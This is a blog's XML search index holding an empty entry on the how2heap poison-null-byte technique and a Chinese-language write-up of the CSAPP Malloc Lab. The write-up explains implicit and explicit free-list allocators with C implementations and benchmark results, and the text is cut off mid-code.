<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<search>
  
  <entry>
    <title>how2heap posion null byte</title>
    <url>/post/how2heap-posion-null-byte.html</url>
    <categories><category>博客</category>
    </categories>
    <tags>
      <tag>PWN</tag>
      <tag>how2heap</tag>
    </tags>
    <content type="html"><![CDATA[]]></content>
  </entry>
  
  <entry>
    <title>CSAPP Malloc Lab</title>
    <url>/post/csapp-malloc-lab.html</url>
    <categories><category>CSAPP</category>
    </categories>
    <tags>
      <tag>CSAPP</tag>
      <tag>Malloc Lab</tag>
    </tags>
    <content type="html"><![CDATA[最近准备研究堆题，于是打算把 CSAPP 的 malloc lab 给完成了，记录一下知识点。
为什么要使用动态内存分配 虽然可以使用低级的 mmap 和 munmap 函数来创建和删除虚拟内存的区域，但是当程序运行时需要额外虚拟内存时，用动态内存分配器（dynamic memory allocator)更方便，也有更好的可移植性。
什么是动态内存分配器 动态内存分配器维护着一个进程的虚拟内存区域，称为堆（heap）（见下图）。它紧接在未初始化的数据区域（.bss段）后开始，并向高地址增长。 对于每个进程，内核维护着一个变量 brk，它指向堆的顶部。
分配器将堆视为一组不同大小的块（block）的集合来维护。每个块都是一块连续的虚拟内存，要么是已分配的，要么是空闲的。已分配的块显式地保留为供应用程序使用。空闲块保持空闲，直到它显式地被应用所分配。一个已分配的块保持已分配状态，直到它被释放。
函数定义 malloc C 标准库提供了一个函数名为 malloc 显式内存分配器。程序通过调用 malloc 函数来从堆中分配块。
#include &lt;stdlib.h&gt; /* 返回值:若成功则返回已分配块的指针，出错返回 NULL */ void *malloc(size_t size); malloc 函数返回一个指针，指向大小为至少 size 字节的内存块，这个块会为可能包含在这个块内的任何数据对象类型做对齐。实际中，对齐依赖于编译代码在 32 位模式（gcc -m32）还是 64 位模式中运行。在 32 位模式中，malloc 返回的块的地址总是 8 的倍数。在 64 位模式中，该地址总是 16 的倍数。
sbrk sbrk 函数通过将内核的 brk 指针增加 incr 来扩展和收缩堆。如果成功，它就返回brk 的旧值，否则，它就返回 -1，并将 errono 设置为 ENOMEM ，如果 incr 为零， sbrk 就返回 brk 的当前值。
#include &lt;stdlib.h&gt; /* 返回值：若成功则为旧的brk指针，出错返回 -1 */ void *sbrk(intptr_t incr); free 程序通过调用 free 函数来释放已分配的堆块。
#include &lt;stdlib.h&gt; void free(void *ptr); ptr 参数必须指向一个从 malloc、calloc 或者 realloc 获得的已分配块的起始位置。如果不是，那么 free 的行为就是未定义的。更糟的是，既然它什么都不返回，free就不会告诉应用出现了错误。
分配器的实现 实现一：Implicit Free List（隐式空闲链表） 如何保存内存块的信息？ 任何实际的分配器都需要一些数据结构，允许它来区别块边界，以及区别已分配块和空闲块。大多数分配器将这些信息嵌入块本身。一个简单的方法如下图所示。
在这种情况中，一个块是由一个字的头部（header）、有效载荷（payload），以及可能的一些额外的填充（padding）组成的。头部编码了这个块的大小（包括头部和所有的填充），以及这个块是已分配的还是空闲的。
由于对齐的要求，块大小必须是 8 或 16 的整数倍，因此我们可以巧妙地利用块大小的低位来保存块的分配情况。
上面这种数据结构有一个问题，合并空闲内存块时无法直接找到它的上一个内存块，需要从堆的开始进行遍历。Knuth 提出了一种叫边界标记的技术：每个块的结尾添加一个 footer（头部的副本），这样就可以通过头部的地址减去头部的大小定位到上一个块的 footer 从而得知上一个块的信息了。
如何放置有效负载到空闲块？ 当一个应用请求一个 k 字节的块（payload）时，分配器需要搜索空闲链表，查找一个大小可以满足请求的空闲块。
分配器如何搜索空闲块有多种方式，被称为放置策略（placement policy）。常见的适配策略有首次适配（first fit)、下一次适配（next fit)和最佳适配（best fit)。
首次适配从头开始搜索空闲链表，选择第一个合适的空闲块。下一次适配和首次适配很相似，只不过不是从链表的起始处开始每次搜索，而是从上一次査询结束的地方开始。最佳适配检査每个空闲块，选择适合所需请求大小的最小空闲块。首次适配的优点是它趋向于将大的空闲块保留在链表的后面。缺点是它趋向于在靠近 链表起始处留下小空闲块的“碎片”，这就增加了对较大块的搜索时间。下一次适配是由Donald Knuth 作为首次适配的一种代替品最早提出的，源于这样一个想法：如果我们上一次在某个空闲块里已经发现了一个匹配，那么很可能下一次我们也能在这个剩余块中发现匹配。下一次适配比首次适配运行起来明显要快一些，尤其是当链表的前面布满了许多小的碎片时。然而，一些研究表明，下一次适配的内存利用率要比首次适配低得多。研究还表明最佳适配比首次适配和下一次适配的内存利用率都要高一些。然而，在简单空闲链表组织结构中，比如隐式空闲链表中，使用最佳适配的缺点是它要求对堆进行彻底的搜索。在后面，我们将看到更加精细复杂的分离式空闲链表组织，它接近于最佳适配策略，不需要进行彻底的堆搜索。
如何分割空闲块？ 如果内存分配器搜索到的空闲块要比请求（payload）的大小大得多，以至于可以把空闲块分割成两个块，那么分配器就要考虑是否要进行分割，否则会造成内存空间的浪费。
由于对齐的需要以及需要记录内存块的信息，实际上最小的 payload 大小是有限制的。footer 和 header 各占 4 字节，payload 的大小最小必须为 8 字节来保证内存对齐。
如何合并内存块？ 有 4 种可能的情况，见下图。
分配器设计 mem_init调用mem_sbrk(4*WSIZE)将堆扩大到 16 Bytes，起始一个 WSIZE 的空间用于对齐，后续3个 WSIZE 用于设置序言块和结尾块，序言块只有 header 和 footer，内容都是 8/1。结尾块的内容是 0/1 。 然后将 head_listp 指向序言块的 footer（相当于指向 payload）。序言块和结尾块不修改，这样做为合并空闲块和遍历堆块提供了方便。链表的形式如下
实现代码 实现了first Fit和 next fit，next fit得分更高， 跑出了 83 / 100 的成绩
Results for mm malloc: trace valid util ops secs Kops 0 yes 91% 5694 0.001076 5293 1 yes 91% 5848 0.000707 8276 2 yes 95% 6648 0.001988 3344 3 yes 97% 5380 0.001947 2763 4 yes 66% 14400 0.000087164948 5 yes 90% 4800 0.003151 1523 6 yes 88% 4800 0.002977 1613 7 yes 55% 12000 0.007354 1632 8 yes 51% 24000 0.004272 5618 9 yes 27% 14401 0.031505 457 10 yes 45% 14401 0.001722 8362 Total 72% 112372 0.056786 1979 Perf index = 43 (util) + 40 (thru) = 83/100 /* * mm-implicit-list.c - Plain malloc package using implicit list. * Fit strategy: next fit. */ #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;assert.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &#34;mm.h&#34; #include &#34;memlib.h&#34; /********************************************************* * NOTE TO STUDENTS: Before you do anything else, please * provide your team information in the following struct. ********************************************************/ team_t team = { /* Team name */ &#34;ateam&#34;, /* First member&#39;s full name */ &#34;Harry Bovik&#34;, /* First member&#39;s email address */ &#34;bovik@cs.cmu.edu&#34;, /* Second member&#39;s full name (leave blank if none) */ &#34;&#34;, /* Second member&#39;s email address (leave blank if none) */ &#34;&#34; }; /* 8 bytes alignment in 32bit mode */ #define ALIGNMENT 8 /* Rounds up to the nearest multiple of ALIGNMENT */ #define ALIGN(size) (((size) + (ALIGNMENT-1)) &amp; ~0x7) //* Basic constants and macros: */ #define WSIZE 4 /* Word and header/footer size (bytes) */ #define DSIZE 8 /* Doubleword size (bytes) */ #define CHUNKSIZE (1&lt;&lt;12) /* Extend heap by this amount (bytes) */ #define MINBLOCKSIZE 16 /* Max value of 2 values */ #define MAX(x, y) ((x) &gt; (y) ? (x) : (y)) /* Pack a size and allocated bit into a word */ #define PACK(size, alloc) ((size) | (alloc)) /* Read and write a word at address p. */ #define GET(p) (*(unsigned int *)(p)) #define PUT(p, val) (*(unsigned int *)(p) = (val)) /* Read the size and allocated fields from address p */ #define GET_SIZE(p) (GET(p) &amp; ~0x7) /* Take attention!!! size = header + payload + footer */ #define GET_ALLOC(p) (GET(p) &amp; 0x1) /* Given block ptr bp, compute address of its header and footer */ #define HDRP(bp) ((char *)(bp) - WSIZE) #define FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE) /* Given block ptr bp, compute address of next and previous blocks */ #define NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp))) #define PREV_BLKP(bp) ((char *)(bp) - GET_SIZE((char *)(bp) - DSIZE)) /* Global declarations */ static char *heap_listp, *prev_listp; /* Function prototypes for internal helper routines */ static void *coalesce(void *bp); static void *extend_heap(size_t words); static void *find_fit(size_t asize); static void place(void *bp, size_t asize); /* * mm_init - initialize the malloc package. */ int mm_init(void) { /* Create the initial empty heap */ if ((heap_listp = mem_sbrk(4*WSIZE)) == (void *) -1) return -1; PUT(heap_listp, 0); /* alignment padding */ PUT(heap_listp + (1*WSIZE), PACK(DSIZE, 1)); /* Prologue header */ PUT(heap_listp + (2*WSIZE), PACK(DSIZE, 1)); /* Prologue footer */ PUT(heap_listp + (3*WSIZE), PACK(DSIZE, 1)); /* Epilogue header */ heap_listp += (2*WSIZE); /* make heap_listp points to epilogue header */ prev_listp = heap_listp; /* Extend the empty heap with a free block of CHUNKSIZE bytes */ if (extend_heap(CHUNKSIZE/WSIZE) == NULL) return -1; return 0; } /* * mm_malloc - Allocate a block by incrementing the brk pointer. * Always allocate a block whose size is a multiple of the alignment. */ void *mm_malloc(size_t size) { size_t asize; /* Adjusted block size */ size_t extendsize; /* Amount to extend heap if not fit */ char *bp; /* Ignore spurious requests */ if (size == 0) { return NULL; } /* Adjust block size to include overhead and alignment reqs */ if (size &lt; DSIZE) asize = 2 * DSIZE; /* Minimum block size: WORD(HDR) + DWORD(Payload) + WORD(FTR) */ else asize = ALIGN(size + 8); /* Search the free list for a fit */ if ((bp = find_fit(asize)) != NULL) { place(bp, asize); return bp; } /* No fit. Get more memory and place the block */ extendsize = MAX(asize, CHUNKSIZE); if ((bp = extend_heap(extendsize / WSIZE)) == NULL) return NULL; place(bp, asize); return bp; } /* * mm_free - Freeing a block and coalesce if necessary. */ void mm_free(void *bp) { size_t size = GET_SIZE(HDRP(bp)); PUT(HDRP(bp), PACK(size, 0)); PUT(FTRP(bp), PACK(size, 0)); coalesce(bp); } /* * mm_realloc - Implemented simply in terms of mm_malloc and mm_free */ void *mm_realloc(void *ptr, size_t size) { void *oldptr = ptr; void *newptr; size_t copySize; newptr = mm_malloc(size); if (newptr == NULL) return NULL; size = GET_SIZE(HDRP(oldptr)); copySize = GET_SIZE(HDRP(newptr)); if (size &lt; copySize) copySize = size; memcpy(newptr, oldptr, copySize-WSIZE); mm_free(oldptr); return newptr; } /* * coalesce - Merge freed block. */ static void* coalesce(void* bp) { size_t prev_alloc = GET_ALLOC(HDRP(PREV_BLKP(bp))); size_t next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp))); size_t size = GET_SIZE(HDRP(bp)); if (prev_alloc &amp;&amp; next_alloc) return bp; else if (prev_alloc &amp;&amp; !next_alloc) { if (NEXT_BLKP(bp) == prev_listp) prev_listp = bp; size += GET_SIZE(HDRP(NEXT_BLKP(bp))); PUT(HDRP(bp), PACK(size, 0)); PUT(FTRP(bp), PACK(size, 0)); prev_listp = bp; } else if (!prev_alloc &amp;&amp; next_alloc) { if (PREV_BLKP(bp) == prev_listp) prev_listp = bp; size += GET_SIZE(HDRP(PREV_BLKP(bp))); PUT(FTRP(bp), PACK(size, 0)); PUT(HDRP(PREV_BLKP(bp)), PACK(size, 0)); bp = PREV_BLKP(bp); prev_listp = bp; } else { if (PREV_BLKP(bp) == prev_listp) prev_listp = bp; size += GET_SIZE(HDRP(PREV_BLKP(bp))) + GET_SIZE(FTRP(NEXT_BLKP(bp))); PUT(HDRP(PREV_BLKP(bp)), PACK(size, 0)); PUT(FTRP(NEXT_BLKP(bp)), PACK(size, 0)); bp = PREV_BLKP(bp); prev_listp = bp; } // prev_listp = bp; return bp; } /* * extend_heap - Extend the heap with a free block and return that block&#39;s payload address. */ static void *extend_heap(size_t words) { char *bp; size_t size; /* Allocate an even number of words to maintain alignment */ size = (words % 2) ? (words + 1) * WSIZE : words * WSIZE; if ((long)(bp = mem_sbrk(size)) == -1) return NULL; /* Initialize free block header/footer and the epilogue header */ PUT(HDRP(bp), PACK(size, 0)); PUT(FTRP(bp), PACK(size, 0)); PUT(HDRP(NEXT_BLKP(bp)), PACK(0, 1)); /* Coalesce if the previous block was free */ return coalesce(bp); } /* Find freeblock that fits the request size and return it&#39;s bp */ static void *find_fit(size_t asize) { // /* Find free block that fits the requsted asize. (first fit)*/ // for(char* bp = heap_listp; GET_SIZE(HDRP(bp)) &gt; 0; bp = NEXT_BLKP(bp)) { // if (!GET_ALLOC(HDRP(bp)) &amp;&amp; GET_SIZE(HDRP(bp)) &gt;= asize) { // return bp; // } // } // return NULL; /* next fit */ for (char* bp = prev_listp; GET_SIZE(HDRP(bp)) &gt; 0; bp = NEXT_BLKP(bp)) { if (!GET_ALLOC(HDRP(bp)) &amp;&amp; GET_SIZE(HDRP(bp)) &gt;= asize) { prev_listp = bp; return bp; } } for (char* bp = heap_listp; bp != prev_listp; bp = NEXT_BLKP(bp)) { if (!GET_ALLOC(HDRP(bp)) &amp;&amp; GET_SIZE(HDRP(bp)) &gt;= asize) { prev_listp = bp; return bp; } } return NULL; } /* Place requested block in a free block, split if necessary */ static void place(void *bp, size_t asize) { size_t blk_size = GET_SIZE(HDRP(bp)); size_t remain_size = blk_size - asize; /* split if we have space space */ if ( remain_size &gt;= 16) { /* set up malloced block */ PUT(HDRP(bp), PACK(asize, 1)); PUT(FTRP(bp), PACK(asize, 1)); /* set up spilited block */ PUT(HDRP(NEXT_BLKP(bp)), PACK(remain_size, 0)); PUT(FTRP(NEXT_BLKP(bp)), PACK(remain_size, 0)); } else { /* set up malloced block */ PUT(HDRP(bp), PACK(blk_size, 1)); PUT(FTRP(bp), PACK(blk_size, 1)); } prev_listp = bp; } 去掉分配块的Footer的实现代码 跑分基本上没区别&hellip;.
Results for mm malloc: trace valid util ops secs Kops 0 yes 90% 5694 0.000995 5721 1 yes 92% 5848 0.000603 9706 2 yes 94% 6648 0.001801 3692 3 yes 96% 5380 0.001816 2963 4 yes 66% 14400 0.000099146193 5 yes 89% 4800 0.003049 1574 6 yes 87% 4800 0.002710 1771 7 yes 55% 12000 0.006541 1835 8 yes 51% 24000 0.004291 5594 9 yes 26% 14401 0.031904 451 10 yes 34% 14401 0.001711 8419 Total 71% 112372 0.055518 2024 Perf index = 43 (util) + 40 (thru) = 83/100 /* * mm.c - Malloc package using implicit free list. (without footer in allocated block) * Free block&#39;s header stores its allocation status in the lowest bit) * and its previous block&#39;s allocation status in the second lowest bit). */ #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;assert.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &#34;mm.h&#34; #include &#34;memlib.h&#34; /********************************************************* * NOTE TO STUDENTS: Before you do anything else, please * provide your team information in the following struct. ********************************************************/ team_t team = { /* Team name */ &#34;ateam&#34;, /* First member&#39;s full name */ &#34;Harry Bovik&#34;, /* First member&#39;s email address */ &#34;bovik@cs.cmu.edu&#34;, /* Second member&#39;s full name (leave blank if none) */ &#34;&#34;, /* Second member&#39;s email address (leave blank if none) */ &#34;&#34; }; /* 8 bytes alignment in 32bit mode */ #define ALIGNMENT 8 /* Rounds up to the nearest multiple of ALIGNMENT */ #define ALIGN(size) (((size) + (ALIGNMENT-1)) &amp; ~0x7) //* Basic constants and macros: */ #define WSIZE 4 /* Word and header/footer size (bytes) */ #define DSIZE 8 /* Doubleword size (bytes) */ #define CHUNKSIZE (1&lt;&lt;12) /* Extend heap by this amount (bytes) */ #define MINBLOCKSIZE 8 /* Minimum block size: WORD(HDR) + WORD(FTR) */ /* Max value of 2 values */ #define MAX(x, y) ((x) &gt; (y) ? (x) : (y)) /* Pack a size and allocated bit into a word */ #define PACK(size, alloc) ((size) | (alloc)) /* `alloc` could be 0, 1, 2 or 3 */ /* Read and write a word at address p. */ #define GET(p) (*(unsigned int *)(p)) #define PUT(p, val) (*(unsigned int *)(p) = (val)) /* Read the size and allocated fields from address p */ #define GET_SIZE(p) (GET(p) &amp; ~0x7) /* Take attention!!! size = header + payload + footer */ #define GET_ALLOC(p) (GET(p) &amp; 0x1) #define GET_PREV_ALLOC(p) (GET(p) &amp; 0x2) #define GET_PREALLOC(p) (GET(p) &amp; 0x2) /* Set and clear prev_alloc status at adress p*/ #define SET_PREV_ALLOC(p) (PUT(p, GET(p) | 0x2)) #define CLR_PREV_ALLOC(p) (PUT(p, GET(p) &amp; ~0x2)) /* Given block ptr bp, compute address of its header and footer */ #define HDRP(bp) ((char *)(bp) - WSIZE) #define FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE) /* Given block ptr bp, compute address of next and previous blocks */ #define NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp))) #define PREV_BLKP(bp) ((char *)(bp) - GET_SIZE((char *)(bp) - DSIZE)) /* Global declarations */ static char *heap_listp, *prev_listp; /* Function prototypes for internal helper routines */ static void *coalesce(void *bp); static void *extend_heap(size_t words); static void *find_fit(size_t asize); static void place(void *bp, size_t asize); /* * mm_init - initialize the malloc package. */ int mm_init(void) { /* Create the initial empty heap */ if ((heap_listp = mem_sbrk(4*WSIZE)) == (void *) -1) return -1; PUT(heap_listp, 0); /* alignment padding */ PUT(heap_listp + (1*WSIZE), PACK(DSIZE, 3)); /* Prologue header */ PUT(heap_listp + (2*WSIZE), PACK(DSIZE, 3)); /* Prologue footer */ PUT(heap_listp + (3*WSIZE), PACK(0, 3)); /* Epilogue header */ heap_listp += (2*WSIZE); /* make heap_listp points to epilogue header */ prev_listp = heap_listp; /* Extend the empty heap with a free block of CHUNKSIZE bytes */ if (extend_heap(CHUNKSIZE/WSIZE) == NULL) return -1; return 0; } /* * mm_malloc - Allocate a block by incrementing the brk pointer. * Always allocate a block whose size is a multiple of the alignment. */ void *mm_malloc(size_t size) { size_t asize; /* Adjusted block size */ size_t extendsize; /* Amount to extend heap if not fit */ char *bp; /* Ignore spurious requests */ if (size == 0) { return NULL; } /* Adjust block size to include overhead and alignment reqs */ if (size &lt; WSIZE) asize = MINBLOCKSIZE; else asize = ALIGN(size + 4); /* Search the free list for a fit */ if ((bp = find_fit(asize)) != NULL) { place(bp, asize); return bp; } /* No fit. Get more memory and place the block */ extendsize = MAX(asize, CHUNKSIZE); if ((bp = extend_heap(extendsize / WSIZE)) == NULL) return NULL; place(bp, asize); return bp; } /* * mm_free - Freeing a block and coalesce if necessary. */ void mm_free(void *bp) { size_t size = GET_SIZE(HDRP(bp)); PUT(HDRP(bp), PACK(size, GET_PREV_ALLOC(HDRP(bp)))); PUT(FTRP(bp), PACK(size, GET_PREV_ALLOC(HDRP(bp)))); coalesce(bp); } /* * mm_realloc - Implemented simply in terms of mm_malloc and mm_free */ void *mm_realloc(void *ptr, size_t size) { if (ptr == NULL) return mm_malloc(size); if (size == 0) mm_free(ptr); void *oldptr = ptr; void *newptr; size_t copySize; newptr = mm_malloc(size); if (newptr == NULL) return NULL; size = GET_SIZE(HDRP(oldptr)); copySize = GET_SIZE(HDRP(newptr)); if (size &lt; copySize) copySize = size; memcpy(newptr, oldptr, copySize-WSIZE); mm_free(oldptr); return newptr; } /* * coalesce - Merge freed block. */ static void* coalesce(void* bp) { void* prev_bp = PREV_BLKP(bp); void* next_bp = NEXT_BLKP(bp); size_t prev_alloc = GET_PREV_ALLOC(HDRP(bp)); /* Now prev allocation status is in our current header */ size_t next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp))); size_t size = GET_SIZE(HDRP(bp)); if (prev_alloc &amp;&amp; next_alloc) { } else if (prev_alloc &amp;&amp; !next_alloc) { size += GET_SIZE(HDRP(next_bp)); PUT(FTRP(next_bp), PACK(size, 2)); PUT(HDRP(bp), PACK(size, 2)); } else if (!prev_alloc &amp;&amp; next_alloc) { size += GET_SIZE(HDRP(prev_bp)); PUT(FTRP(bp), PACK(size, 2)); PUT(HDRP(prev_bp), PACK(size, 2)); /* prev is free, PREV_BLKP(prev) must be allocated */ bp = prev_bp; } else { size += GET_SIZE(HDRP(prev_bp)) + GET_SIZE(FTRP(next_bp)); PUT(FTRP(next_bp), PACK(size, 2)); PUT(HDRP(prev_bp), PACK(size, 2)); bp = prev_bp; } CLR_PREV_ALLOC(HDRP(NEXT_BLKP(bp))); prev_listp = bp; return bp; } /* * extend_heap - Extend the heap with a free block and return that block&#39;s payload address. */ static void *extend_heap(size_t words) { char *bp; size_t size; /* Allocate an even number of words to maintain alignment */ size = (words % 2) ? (words + 1) * WSIZE : words * WSIZE; if ((long)(bp = mem_sbrk(size)) == -1) return NULL; /* Initialize free block header/footer and the epilogue header */ PUT(HDRP(bp), PACK(size, GET_PREV_ALLOC(HDRP(bp)))); PUT(FTRP(bp), PACK(size, GET_PREV_ALLOC(HDRP(bp)))); PUT(HDRP(NEXT_BLKP(bp)), PACK(0, 1)); /* Coalesce if the previous block was free */ return coalesce(bp); } /* Find freeblock that fits the request size and return it&#39;s bp */ static void *find_fit(size_t asize) { for (char* bp = prev_listp; GET_SIZE(HDRP(bp)) &gt; 0; bp = NEXT_BLKP(bp)) { if (!GET_ALLOC(HDRP(bp)) &amp;&amp; GET_SIZE(HDRP(bp)) &gt;= asize) { prev_listp = bp; return bp; } } for (char* bp = heap_listp; bp != prev_listp; bp = NEXT_BLKP(bp)) { if (!GET_ALLOC(HDRP(bp)) &amp;&amp; GET_SIZE(HDRP(bp)) &gt;= asize) { prev_listp = bp; return bp; } } return NULL; } /* Place requested block in a free block, split if necessary */ static void place(void *bp, size_t asize) { size_t blk_size = GET_SIZE(HDRP(bp)); size_t remain_size = blk_size - asize; /* split if we have space space */ if ( remain_size &gt;= MINBLOCKSIZE) { /* |4 Byte HDR| Payload | 4 Bytes FTR| */ /* set up malloced block */ PUT(HDRP(bp), PACK(asize, 3)); /* set up spilited block */ PUT(HDRP(NEXT_BLKP(bp)), PACK(remain_size, 2)); PUT(FTRP(NEXT_BLKP(bp)), PACK(remain_size, 2)); /* Clear alloc status of next */ CLR_PREV_ALLOC(HDRP(NEXT_BLKP(NEXT_BLKP(bp)))); } else { /* set up malloced block */ PUT(HDRP(bp), PACK(blk_size, 3)); /* Set alloc status of next block */ SET_PREV_ALLOC(HDRP(NEXT_BLKP(bp))); } prev_listp = bp; } 实现二：Explicit Free List（显示空闲链表） 如何保存内存块的信息？ 上面的实现有一个问题：每次在寻找未分配的块时需要同时遍历已分配的块和未分配的块，遍历已分配的块的操作显然是多余的。
一种更好的方法是将空闲块组织为某种形式的显示数据结构（双向链表），可以巧妙利用空闲块的 payload 部分来保存这个数据结构的指针（前驱 pred 和后继 succ）。如下图所示
堆块的放置、合并、分割 使用显式空闲链表，使首次适配（first fit）的分配时间从块总数的线性时间减少到了空闲块数量的线性时间。不过，释放一个块的时间可以是线性的，也可能是个常数，这取决于我们所选择的空闲链表中块的排序策略。
一种方法是用后进先出（LIFO）的顺序维护链表，将新释放的块放到链表的开头，使用LIFO和First Fit的放置策略释放堆块可以在常数时间内完成。如果使用了边界标记则合并堆块（基于堆地址的线性合并）也可以在常数时间内完成。
另一种方法是按地址顺序维护链表，后继的地址大于前驱块的地址，这种情况下，释放一个块需要线性时间来搜索链表确定前驱。但是，按照地址排序的首次适配比 LIFO 排序的首次适配有更高的内存利用率，接近最佳适配的利用率。
显式链表的缺点是空闲块必须足够大，以包含所有需要的指针，以及头部和可能的脚部。这就导致了更大的最小块大小，也潜在地提高了内部碎片的程度。
分配器设计 链表的形式和之前一样，唯一的区别就是空闲块的 payload 用于存放链表的指针
双向链表的维护比较复杂，建议把每种情况都考虑清楚再开始写代码，不然就是无尽的 debug
逻辑分析 mm_init(): HEAP: Padding|Prologue|Prologue|Epilogue, Free list = NULL --&gt;extend_head(4096): Padding|Prologue|Prologue|HDR|Payload|FTR|Epilogue, Free list: NULL --&gt;coalesce(bp): No merge --&gt;insert(bp) HEAP: Padding|Prologue|Prologue|HDR|Payload|FTR|Epilogue, Free list: Payload malloc(size): Padding|Prologue|Prologue|(HDR|Payload|FTR)n|Epilogue, Free list: Payload /* Case 1 */ --&gt;find_fit(size): Found Fit. Return bp of Payload --&gt;place(bp): Split --&gt;remove(bp): Free list: NULL --&gt;coalesce(NEXT_BLKP(bp)): No merge. Prev/Next block must be allocated since current is Free. --&gt;insert(NEXT_BLKP(bp)) Free list: NEXT_BLKP(bp) --&gt;place(bp): No Split: --&gt;remove(bp): Free list: NULL /* Case 2 */ --&gt;find_fit(size): No Fit. Return NULL; --&gt;extend_heap(MAX(size, chunksize) --&gt;coalesce(new_bp) /* Case 1: No merge */ --&gt;insert(new_bp) /* Case 2: Merg prev. Return PREV_BLKP(new_bp) */ bp = return value of extend_heap(): new_bp or PREV_BLKP(new_bp) --&gt;place(bp): Split --&gt;remove(bp); --&gt;coalesce(NEXT_BLKP(bp)): No Merge. We&#39;ve just extended heap, NEXT_BLKP(bp) is LAST BLOCK --&gt;insert(NEXT_BLKP(bp)) --&gt;place(bp): No Split: --&gt;remove(bp): Okay, bp newly added to free list or already in it. free(bp): --&gt;coalesce(bp): /* Case 1. No merge. */ --&gt;insert(bp) /* Case 2. Merg prev. */ /* Case 3. Merg next. Remove next block. */ --&gt;remove(next_bp) --&gt;insert(bp) /* Case 4. Merg prev and next. Remove next block. */ --&gt;remove(next_bp) realloc(bp): it&#39;s just malloc, memcpy and free. 实现代码 使用LIFO顺序维护链表，First Fit和边界标记的显式空闲链表分配器实现如下，貌似性能并不如Implicit Free List，猜测是插入方式的原因
Results for mm malloc: trace valid util ops secs Kops 0 yes 88% 5694 0.000233 24490 1 yes 93% 5848 0.000192 30538 2 yes 95% 6648 0.000325 20487 3 yes 97% 5380 0.000267 20112 4 yes 66% 14400 0.000307 46936 5 yes 89% 4800 0.000503 9541 6 yes 88% 4800 0.000483 9940 7 yes 55% 12000 0.001122 10698 8 yes 51% 24000 0.001411 17004 9 yes 27% 14401 0.032037 450 10 yes 30% 14401 0.002032 7087 Total 71% 112372 0.038911 2888 Perf index = 42 (util) + 40 (thru) = 82/100 /* * mm.c - Malloc package using explicit free list. * Newly freed block will be inserted to the head of free list. */ #include &lt;stddef.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;assert.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &#34;mm.h&#34; #include &#34;memlib.h&#34; /********************************************************* * NOTE TO STUDENTS: Before you do anything else, please * provide your team information in the following struct. ********************************************************/ team_t team = { /* Team name */ &#34;ateam&#34;, /* First member&#39;s full name */ &#34;Harry Bovik&#34;, /* First member&#39;s email address */ &#34;bovik@cs.cmu.edu&#34;, /* Second member&#39;s full name (leave blank if none) */ &#34;&#34;, /* Second member&#39;s email address (leave blank if none) */ &#34;&#34; }; // #define DEBUG #ifdef DEBUG # define DBG_PRINTF(...) printf(__VA_ARGS__) # define CHECKHEAP(verbose) mm_checkheap(verbose) #else # define DBG_PRINTF(...) # define CHECKHEAP(verbose) #endif /* 8 bytes alignment in 32bit mode */ #define ALIGNMENT 8 /* Rounds up to the nearest multiple of ALIGNMENT */ #define ALIGN(size) (((size) + (ALIGNMENT-1)) &amp; ~0x7) //* Basic constants and macros: */ #define WSIZE 4 /* Word and header/footer size (bytes) */ #define DSIZE 8 /* Doubleword size (bytes) */ #define CHUNKSIZE (1&lt;&lt;12) /* Extend heap by this amount (bytes) */ #define MINBLOCKSIZE 16 /* Max value of 2 values */ #define MAX(x, y) ((x) &gt; (y) ? (x) : (y)) /* Pack a size and allocated bit into a word */ #define PACK(size, alloc) ((size) | (alloc)) /* Read and write a word at address p. */ #define GET(p) (*(unsigned int *)(p)) #define PUT(p, val) (*(unsigned int *)(p) = (val)) /* Read the size and allocated fields from address p */ #define GET_SIZE(p) (GET(p) &amp; ~0x7) #define GET_ALLOC(p) (GET(p) &amp; 0x1) /* Given block ptr bp, compute address of its header and footer */ #define HDRP(bp) ((char *)(bp) - WSIZE) #define FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE) /* Given block ptr bp, compute address of foward and back pointer field (foward and back blocks are logically linked) */ #define FDP(bp) (*(char **)(bp + WSIZE)) #define BKP(bp) (*(char **)(bp)) /* Given block ptr bp, compute address of next and previous blocks */ #define NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp))) #define PREV_BLKP(bp) ((char *)(bp) - GET_SIZE((char *)(bp) - DSIZE)) /* Set BK and FD field of a block by given pointer */ #define SET_BKP(bp, bkp) (BKP(bp) = bkp) #define SET_FDP(bp, fdp) (FDP(bp) = fdp) /* Global declarations */ static char *heap_listp; static char *freelist_headp; /* Function prototypes for internal helper routines */ static void *coalesce(void *bp); static void *extend_heap(size_t words); static void *find_fit(size_t asize); static void place(void *bp, size_t asize); static void insert(void *bp); /* insert a free block to free list */ static void delete(void *bp); /* delete a free block from free list */ static void mm_checkheap(int verbose); /* * mm_init - initialize the malloc package. */ int mm_init(void) { /* Create the initial empty heap */ if ((heap_listp = mem_sbrk(4*WSIZE)) == (void *) -1) return -1; PUT(heap_listp, 0); /* alignment padding */ PUT(heap_listp + (1*WSIZE), PACK(DSIZE, 1)); /* Prologue header */ PUT(heap_listp + (2*WSIZE), PACK(DSIZE, 1)); /* Prologue footer */ PUT(heap_listp + (3*WSIZE), PACK(0, 1)); /* Epilogue header */ freelist_headp = NULL; /* Extend the empty heap with a free block of CHUNKSIZE bytes */ if (extend_heap(CHUNKSIZE/WSIZE) == NULL) /* set free list head to the first free block */ return -1; return 0; } /* * mm_malloc - Allocate a block by incrementing the brk pointer. * Always allocate a block whose size is a multiple of the alignment. */ void *mm_malloc(size_t size) { DBG_PRINTF(&#34;Entering mm_malloc(%zu)\n&#34;, size); size_t asize; /* Adjusted block size */ size_t extendsize; /* Amount to extend heap if not fit */ char *bp; /* Ignore spurious requests */ if (size == 0) { return NULL; } /* Adjust block size to include overhead and alignment reqs */ if (size &lt; DSIZE) asize = 2 * 